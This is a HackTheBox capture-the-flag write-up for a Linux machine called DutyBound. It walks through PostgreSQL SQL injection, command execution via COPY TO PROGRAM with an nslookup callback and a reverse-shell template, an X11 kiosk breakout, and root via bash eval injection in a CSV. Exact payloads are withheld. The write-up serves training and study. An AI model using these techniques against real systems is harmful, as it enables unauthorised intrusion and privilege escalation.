# DutyBound — HackTheBox Writeup

> **Difficulty:** Medium · **OS:** Linux · **Status:** Active (no direct spoilers)

---

## Attack chain summary

```
Recon → blind SQLi (time-based + error-based) → RCE via COPY TO PROGRAM → Shell as postgres
→ Kiosk X11 breakout → Shell as dutyfree-kiosk → CSV injection (eval) → Root
```

---

## Phase 1 — Reconnaissance

Initial scan with `nmap` to identify ports and services. The open ports reveal a web application and a database server.

The website simulates an **airport duty-free self-checkout**. When interacting with the API endpoints, you notice that requests carry a `raw` field with data in a proprietary point-of-sale (POS) format.

**Hint:** Pay attention to the exact format of the `raw` field and how the backend parses it. It is not standard JSON — the entire value is processed as a structured string with positional fields.

---

## Phase 2 — SQL Injection (PostgreSQL)

### Discovery

When manipulating the `raw` field, the application returns PostgreSQL errors in plain text. This is gold: the backend does not sanitize exceptions before returning them to the client.

The injection falls inside a statement with **multiple parameters and nested parentheses**. Closing the context correctly before injecting is essential — the number of parentheses that need to be closed is discovered from the error message returned by Postgres itself.

**Hint:** The `syntax error at or near` error tells you exactly where in the SQL your payload falls. Use it to count open parentheses.

### Available techniques

**Time-based blind** — Initial confirmation with `pg_sleep(N)`. To extract boolean data without visible output:

```sql
SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END
```

**Error-based** — Much faster. The backend returns the Postgres error detail including the value that caused the failure. Forcing an invalid cast makes the data appear in the message:

```sql
AND 1=CAST((SELECT data_to_extract) AS INT)
```

**Stacked queries** — Once the parenthesis context is resolved, it is possible to stack statements with `;`. This opens the door to functions that cannot be executed as a subquery.

**Hint for confirming superuser:** Use error-based to ask for `current_user`, `rolsuper` from `pg_roles`, and the roles you are a member of. This determines which RCE path you have available.

---

## Phase 3 — RCE from PostgreSQL

PostgreSQL has the `COPY ... TO PROGRAM` function, which executes an OS command. It is only available to roles with sufficient privileges.

**Hint:** Before attempting `COPY TO PROGRAM`, confirm via error-based whether you have the necessary privileges. If you are not a superuser directly, investigate group roles.

### Verifying command execution

Before launching a reverse shell directly, use an out-of-band channel to confirm that RCE works. A DNS query to Burp Collaborator (or similar) is ideal: if the server performs the resolution, the command was executed.

```sql
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]
```

### Reverse shell

Once RCE is confirmed, the reverse shell with `bash`. The challenge with escape characters inside SQL quotes in PostgreSQL is solved by using **doubled single quotes** (`''`) instead of double quotes:

```sql
COPY (SELECT '') TO PROGRAM 'bash -c ''COMMAND_HERE'''
```

**Shell obtained as:** `postgres` (uid=114)

---

## Phase 4 — Post-exploitation enumeration

From the `postgres` shell:

- Checking running processes (`ps aux`) reveals an **active X11 graphical session** running as another system user, with Firefox in kiosk mode.
- The `/opt/vrs/` directory contains the web application, maintenance scripts, and configuration files with valuable information.
- PostgreSQL's `pg_shadow` file contains password hashes — try cracking them with rockyou, although in this case it is not the main path.
- A bash script in `/opt/vrs/bin/` uses `eval` on unsanitized data from a CSV file. The CSV file is writable by a specific group.

**Hint:** Which system user belongs to that group? How do you reach that user?

---

## Phase 5 — Kiosk X11 Breakout

The target user runs a full graphical session with Openbox + Firefox in `--kiosk` mode. The X server socket (`/tmp/.X11-unix/X0`) has `777` permissions — no MIT-MAGIC-COOKIE authentication is applied.

This means any system process can connect to display `:0` and send synthetic input events.

**Tool:** `python3-xlib` is available. The **XTEST** extension allows simulating key presses programmatically without `xdotool` or other external tools:

```python
from Xlib import X, XK, display
from Xlib.ext import xtest
```

**Hint:** Openbox has default keyboard shortcuts configured. One of the most common opens a terminal emulator. Try it before attempting to escape Firefox directly.

**Keyboard layout considerations:** The system may have a different layout than yours. To avoid issues with special characters (`:`, `/`, `-`, `>`, `&`), instead of typing the reverse shell directly into the terminal, write the payload to a file from your `postgres` shell and in the kiosk terminal only execute the file name.

**Watch permissions:** Files created by `postgres` are not readable by `dutyfree-kiosk` by default. Adjust permissions before trying to execute.

**Shell obtained as:** `dutyfree-kiosk` (uid=1000, groups: `dutyfree-kiosk`, `pos-ops`)

---

## Phase 6 — Privilege escalation to Root (Bash eval injection in CSV)

The script `/opt/vrs/bin/apply-duty-rates.sh` is triggered automatically by a `systemd .path` unit that watches for changes in `/opt/vrs/data/duty-rates.csv`.

The script validates with a regex that the CSV numeric fields (`duty_pct`, `vat_pct`) contain only digits, but **the `tax_class` field is inserted directly into an `eval`** without any sanitization:

```bash
eval "${tax_class}=${duty_pct}"
```

**The vector:** Modify `tax_class` so that it contains a command separated by `;`. The numeric field that follows can become a bash comment with `#`.

Since `dutyfree-kiosk` belongs to the `pos-ops` group, it has write permissions on the CSV. When the malicious file is saved, systemd's `.path` detects the change and launches the script **as root** within seconds.

**Hint:** Avoid special characters in the CSV payload by using an intermediate script with the correct permissions (the same trick as in the previous phase).

**Root obtained.**

---

## Key concepts learned

| Concept | Description |
| --- | --- |
| Error-based SQLi in PostgreSQL | Extract data by exfiltrating values in invalid cast error messages |
| Stacked queries in PostgreSQL | Stack statements with `;` to execute `COPY TO PROGRAM` |
| COPY TO PROGRAM | PostgreSQL function to execute OS commands (requires privileges) |
| X11 without authentication | Socket with `777` permissions allows sending events to other users' graphical sessions |
| XTEST extension | X11 API for injecting synthetic keyboard/mouse events |
| Bash eval injection | `eval` on unsanitized data in scripts allows command injection |
| Systemd .path units | Units that automatically trigger services when file changes are detected |

---

## Tools used

- `nmap` — Network reconnaissance
- `Burp Suite` / manual HTTP request tool — API manipulation
- `python3-xlib` — X11 automation / kiosk breakout
- `nc` (netcat) — Reverse shell listeners
- `psql` — PostgreSQL client for database exploration

---

*Original writeup — Active machine. Exact payloads and flags are omitted.*
